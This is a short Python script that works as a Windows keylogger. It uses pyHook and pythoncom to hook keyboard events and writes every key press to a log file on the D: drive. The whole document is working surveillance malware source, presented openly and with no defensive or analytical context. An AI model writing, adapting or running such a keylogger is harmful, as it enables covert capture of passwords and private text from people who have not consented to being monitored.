import pyHook, pythoncom, sys, logging

#Log File: Stores the logs of keyboard events
file_log = 'D:\\keyloggeroutput.txt'
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
#Sets a hook on Windows Events
hooks_manager = pyHook.HookManager()
#sets the hook on keyboard events and captures the key presses
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
#pythoncom module captures the messages
pythoncom.PumpMessages()
